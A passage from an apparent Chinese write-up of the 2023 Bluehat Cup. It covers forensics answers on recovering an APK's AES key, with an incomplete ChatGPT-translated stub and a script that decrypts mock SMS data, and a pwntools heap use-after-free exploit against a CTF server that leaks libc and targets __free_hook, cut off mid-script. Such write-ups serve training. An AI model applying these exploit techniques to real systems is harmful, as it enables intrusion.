XRlOiBUdWUgQXVnIDE3IDE3OjMyOjE0IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTc6MzE6NDggR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNzozMTozMSBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE3OjMwOjM1IEdNVCswODowMCAyMDIxCk51bWJlcjogKzg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNzozMDozMCBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6ICs4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTc6Mjk6MzggR01UKzA4OjAwIDIwMjEKTnVtYmVyOiArODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE1OjU3OjQ5IEdNVCswODowMCAyMDIxCk51bWJlcjogKzg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNTo0OToxMiBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6ICs4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTU6NDg6NTAgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNTo0Mzo1OCBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE1OjM0OjIxIEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTU6MzM6NTMgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNTozMzoxMSBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE1OjMyOjUyIEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTU6MzE6NTggR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNToyNzoxMyBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE1OjI2OjA5IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTU6MjQ6MzQgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNToyMDoxMyBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE1OjE5OjIzIEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTU6MTg6MDIgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNToxNDowMyBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE1OjA5OjIyIEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTU6MDg6NTcgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNTowNzoyMCBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE1OjAyOjA1IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTU6MDE6NDYgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNDo1Nzo0NiBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE0OjU3OjA1IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTQ6NTA6NTMgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNDo0OTo1NyBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE0OjQ4OjM1IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTQ6NDc6MTggR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNDo0NzowNSBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE0OjQ2OjI0IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTQ6NDQ6MzAgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNDo0Mjo0NiBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE0OjQyOjExIEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NioqKioqKioqKioqLCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTQ6Mzg6NDkgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2KioqKioqKioqKiosIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNDozNjoyMyBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYqKioqKioqKioqKiwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE0OjI2OjM2IEdNVCswODowMCAyMDIxCk51bWJlcjogKzg2KioqKioqKioqKiosIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNDoyNDoyMiBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6ICs4NioqKioqKioqKioqLCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTQ6MjQ6MDMgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiArODYqKioqKioqKioqKiwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE0OjIyOjEyIEdNVCswODowMCAyMDIxCk51bWJlcjogKzg2KioqKioqKioqKiosIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxMTowNDo0MSBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6ICs4NioqKioqKioqKioqLCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTE6MDQ6MDQgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiArODYqKioqKioqKioqKiwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDExOjAzOjE4IEdNVCswODowMCAyMDIxCk51bWJlcjogMTAwODYsIFR5cGU6IOWRvOi/mywgRGF0ZTogTW9uIEF1ZyAxNiAxMDo0NDo0MiBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDEwMDg2LCBUeXBlOiDlkbzov5ssIERhdGU6IEZyaSBBdWcgMTMgMTc6NTU6NTQgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwNTcxNTYzNzE2NDMsIFR5cGU6IOWRvOWHuiwgRGF0ZTogTW9uIE1hciAwMSAxNTo1OTowNSBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDA1MTE4MDk2MTQxNywgVHlwZTog5ZG85Ye6LCBEYXRlOiBNb24gTWFyIDAxIDE1OjEzOjQyIEdNVCswODowMCAyMDIxCg==</code></pre><p>这一题也是有点傻傻的感觉，本来还在找AES的密钥，结果半天找不着，死马当做活马医</p><p>直接丢到厨子里</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917133434-15gzhbb.png" alt="image">​</p><p>啊这，直接base64解了，服了</p><p>看到两次10086通话</p><h4 id="13-测试apk对短信记录进行了几次加密？（答案格式：5）"><a href="#13-测试apk对短信记录进行了几次加密？（答案格式：5）" class="headerlink" title="13.测试apk对短信记录进行了几次加密？（答案格式：5）"></a>13.测试apk对短信记录进行了几次加密？（答案格式：5）</h4><p>这题答案确实是2</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917133548-tau19p3.png" alt="image">​</p><p>看到就是一次AES，一次Base64，所以是填了两次</p><h4 id="14-测试apk对短信记录进行加密的秘钥是？（答案格式：slkdjlfslskdnln）"><a href="#14-测试apk对短信记录进行加密的秘钥是？（答案格式：slkdjlfslskdnln）" class="headerlink" title="14.测试apk对短信记录进行加密的秘钥是？（答案格式：slkdjlfslskdnln）"></a>14.测试apk对短信记录进行加密的秘钥是？（答案格式：slkdjlfslskdnln）</h4><p>取证里有反编译</p><p>这是真滴头疼，ISCC学的一手F5大神上线</p><p>我们把apk包改成zip解压，分析里面的so包</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917133825-pwfmxdr.png" alt="image">​</p><p>直接搜索一手key</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917194400-1446vja.png" alt="image">​</p><p>可以找到这个Getkey</p><p>看不懂这个东西丢给chatgpt</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917194423-hhnpnp2.png" alt="image">​</p><p>他说是First，那就First</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917194440-uxq9yb5.png" alt="image">​</p><p>跟进可以看到神秘字符串：<code>lijubdyhfurindhcbxdw</code>​</p><p>但是可以发现这个是个二十位的，叫chatgpt翻译成python，起码对python比较熟悉：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Getkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    first <span class="token operator">=</span> <span class="token string">"your_input_string"</span>  <span class="token comment" spellcheck="true"># 你需要替换成实际的输入字符串</span>    <span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFC</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> \               chr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span>    encoded_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> first<span class="token punctuation">:</span>        encoded_chars<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    encoded_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encoded_chars<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 替代 sub_209E0 函数的逻辑</span>    <span class="token keyword">def</span> <span class="token function">sub_209E0</span><span class="token punctuation">(</span>encoded_str<span class="token punctuation">,</span> v13<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 这里应该是对 encoded_str 进行一些操作</span>        <span class="token comment" spellcheck="true"># 你需要根据实际的 sub_209E0 函数来实现这一部分的逻辑</span>        <span class="token keyword">pass</span>    v15 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">25</span>    sub_209E0<span class="token punctuation">(</span>v15<span class="token punctuation">,</span> encoded_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 16LL 可能是长度，根据实际情况调整</span>    <span class="token comment" spellcheck="true"># 替代 sub_20740 函数的逻辑</span>    <span class="token keyword">def</span> <span class="token function">sub_20740</span><span class="token punctuation">(</span>encoded_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 这里应该是对 encoded_str 进行一些操作</span>        <span class="token comment" spellcheck="true"># 你需要根据实际的 sub_20740 函数来实现这一部分的逻辑</span>        <span class="token keyword">pass</span>    v5 <span class="token operator">=</span> sub_20740<span class="token punctuation">(</span>encoded_str<span class="token punctuation">)</span>    v7 <span class="token operator">=</span> v5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 使用UTF-8编码将结果转换为字节串</span>    <span class="token keyword">return</span> v7<span class="token comment" spellcheck="true"># 调用 Getkey 函数</span>result <span class="token operator">=</span> Getkey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>可以看到这里的16LL是截取了前16位</p><p>所以我们丢到厨子里面</p><p>这里</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917194832-0399hjo.png" alt="image">​</p><p>做了base64编码</p><p>可以跟进确认：</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917194902-uah0pqf.png" alt="image">​</p><p>所以我们就是</p><p>对base64编码后的取前16位</p><p>密钥就是前16位：</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917195042-d6bvorf.png" alt="image">​</p><p>bGlqdWJkeWhmdXJp</p><h4 id="15-嫌疑人在2021年登录支付宝的验证码是？（答案格式：3464）"><a href="#15-嫌疑人在2021年登录支付宝的验证码是？（答案格式：3464）" class="headerlink" title="15.嫌疑人在2021年登录支付宝的验证码是？（答案格式：3464）"></a>15.嫌疑人在2021年登录支付宝的验证码是？（答案格式：3464）</h4><p>这一题就对短信进行解码了，反正你都有密钥了</p><p>不过这里解密不了厨子 ，因为厨子对中文解码有点问题，就用python吧</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">decrypt_data</span><span class="token punctuation">(</span>encrypted_data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># Decode the Base64-encoded encrypted data</span>        encrypted_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encrypted_data<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Create an AES cipher object</span>        cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Decrypt the data</span>        decrypted_data <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encrypted_data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> decrypted_data    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Failed to decrypt data:"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> None<span class="token comment" spellcheck="true"># Your AES encryption key (must be the same key used for encryption)</span>encryption_key <span class="token operator">=</span> <span class="token string">"bGlqdWJkeWhmdXJpbmRoY2J4ZHc="</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># The Base64-encoded encrypted data</span>encrypted_text <span class="token operator">=</span> <span class="token triple-quoted-string string">"""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"""</span><span class="token comment" spellcheck="true"># Decrypt the data</span>decrypted_data <span class="token operator">=</span> decrypt_data<span class="token punctuation">(</span>encrypted_text<span class="token punctuation">,</span> encryption_key<span class="token punctuation">)</span><span class="token keyword">if</span> decrypted_data <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypted Data:"</span><span class="token punctuation">,</span> decrypted_data<span class="token punctuation">)</span></code></pre><p>​<img src="/Blogimages/2023bluehatcup/image-20230917201358-gnusk94.png" alt="image">​</p><p>倒数第二行支付宝验证码9250</p><p>‍</p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>非预期</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230916122455-ouwp8q5.png" alt="image">​</p><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#p = process('./main')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'120.78.172.238'</span><span class="token punctuation">,</span> <span class="token number">48834</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Passwd: '</span><span class="token punctuation">,</span> <span class="token string">'1234567890\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_delta <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ebbe0</span>free_hook <span class="token operator">=</span> libc_delta <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_delta <span class="token operator">+</span> <span class="token number">0xe6c7e</span>admin_login<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name: \n'</span><span class="token punctuation">,</span> <span class="token string">'%7$p'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token 